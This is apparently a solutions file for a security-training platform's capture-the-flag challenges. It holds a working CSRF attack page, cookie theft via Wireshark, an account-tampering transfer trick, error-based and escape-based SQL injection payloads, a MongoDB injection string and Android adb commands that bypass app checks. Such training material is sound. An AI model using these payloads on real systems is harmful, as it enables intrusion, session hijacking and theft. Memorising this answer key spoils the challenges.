It can be accessed via a HTTP server, a public Dropbox link, a shared file area. It is possible to use HTML forms to submit cross domain POST requets with JSON payloads by setting the <b>enctype</b> attribute to text/plain and then forming the JSON payload around the necessary equals symbol which normally deliminates the parameter name from the parameter value. The following is an example web page that would complete the challenge<br/><br/>&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;form id=&quot;completeChallengeJson&quot; enctype=&quot;text/plain&quot; action=&quot;https://hostname:port/user/csrfchallengetwo/plusplus&quot; method=&quot;POST&quot; &gt;<br/>&lt;input type=&quot;hidden&quot; name=&#x27;{&quot;userId&quot;:&quot;exampleId&quot;,&quot;&#x27; value=&#x27;&quot;,&quotend&quote}&#x27;><br/>&lt;/form&gt;<br/>&lt;script&gt;<br/>document.forms[&quot;completeChallengeJson&quot;].submit();<br/>&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/><br/>The class form function should be used to create an iframe that forces the user to visit this attack page.
6158a695f20f9286d5f12ff3f4d42678f4a9740c.solution = To complete this challenge, you must be able to capture the traffic of another user. The simplest way to simulate this would be to create a second user account and open it in a separate browser and open this challenge. You could then just steal the cookie straight from the browser. To demo how to solve this as expected you would actually open Wireshark and record the 2nd user opening the challenge. Filter the network capture for ip.dst == ShepherdInstanceIp, and find the unencrypted HTTP packet. Right click it and select 'Follow TCP stream'. You'll see the cookie in that dialog. <br><br> Once you have the token collected, in your original browser, click the button and intercept the request with a Proxy. Replace your cookie value with the one you collected from another user.
de626470273c01388629e5a56ac6f17e2eef957b.solution = To complete this challenge you must first register an account. The account must have a unique name. The next step is to click the refresh balance button. Capture this request, and replay it with different account numbers until you find one with cash. If you are the first person to attempt this challenge, the account number 1 should have 10 million in it. Take note of the account number that has cash. Now fill out the 'Transfer Funds' form with any data. Capture that requets and change the receiver account number parameter to the value the sender account number parameter is currently equal to (This is your account number), change the sender account number to the identifier you noted earlier and set the transfer amount to as high as possible (must be some money left in account to work). Keep doing this untill your account has more than 5 million in it. Then open the level again or sign in / out of the account to get the result key
dc89383763c68cba0aaa1c6f3fd4c17e9d49a805.solution = The following attack vectors will expose the result key over two queries.<br><br>Step One: <b>test' AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x716b6a7671,(SELECT MID((IFNULL(CAST(comment AS CHAR),0x20)),1,50) FROM sqlchalstoredproc.customers ORDER BY customerId LIMIT 2,1),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'hdTL'='hdTL</b><br><br>This will return an error revealing the first part of the key in the message with <b>qxkzq1</b> added to the end for padding. remove those characters and record the rest of the key revealed. <br><br>Step Two: <b>test' AND (SELECT 9441 FROM(SELECT COUNT(*),CONCAT(0x716b6a7671,(SELECT MID((IFNULL(CAST(comment AS CHAR),0x20)),51,50) FROM sqlchalstoredproc.customers ORDER BY customerId LIMIT 2,1),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'ilGf'='ilGf</b><br><br>This will reveal the second part of the key, padded with <b>qkjvq</b> at the start and <b>qxkzq1</b> at the end. Remove the padding and add the rest to the previously revealed part of the result key. That is the key to solve this challenge.
5b461ebe2e5e2797740cb3e9c7e3f93449a93e3a.solution = Connect to the device via adb and run the following command - adb shell content query --uri content://com.somewhere.hidden.SecretProvider/data
c685f8102ae0128c2ab342df64699bb8209a0839.solution = One way to exploit this security risk is to escape the leading backslash that is added before apostrophes with another backslash. The following attack vector will solve the level;<br><br> &#x5c;&apos;or&quot;1&quot;=&quot;1&quot;&#x3b;&nbsp--&nbsp
d7eaeaa1cc4f218abd86d14eefa183a0f8eb6298.solution = The database in this level utilises MongoDb which does NOT use SQL. Queries in MongoDb are done through JavaScript. <br>You need to stop the request in an HTTP proxy and use the following JavaScript to exploit the vulnerability:<br /> <em>';return(true);var a='a</em>
064e28ea4b2f7708b8cb4495d9db1a5e05decdb8.solution = To complete this challenge, register a user on the App then use ADB to pull the database file from the device. Edit the database file so that the verified column is not equal to false and push the file back onto the device. Now you can authenticate and get the key
6f5db377c28da4179bca1a43ede8d6bcf7bd322e.solution = To complete this challenge use the following command to get to the key activity:am start -n com.mobshep.untrustedinput/.admin Now click the get key button. To run this command ensure you have an adb shell running (alt + f1 in emulator or adb shell command from platform-tools in the Android SDK)
